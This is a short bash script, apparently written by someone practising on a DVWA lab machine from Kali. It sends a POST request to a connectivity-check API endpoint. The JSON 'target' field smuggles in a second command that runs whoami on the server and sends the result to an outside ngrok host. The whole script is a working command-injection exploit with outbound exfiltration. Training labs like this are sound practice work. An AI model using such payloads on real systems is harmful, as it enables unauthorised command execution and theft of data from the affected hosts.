#!/bin/bash

curl -X POST \
http://192.168.56.105/DVWA/vulnerabilities/api/v2/health/connectivity \
-H "Content-Type: application/json" \
-d '{ "target":"127.0.0.1;curl https://multichanneled-alkalimetrically-rayford.ngrok-free.dev?cmd=$(whoami)" }' \
> /home/kali/api_high.log
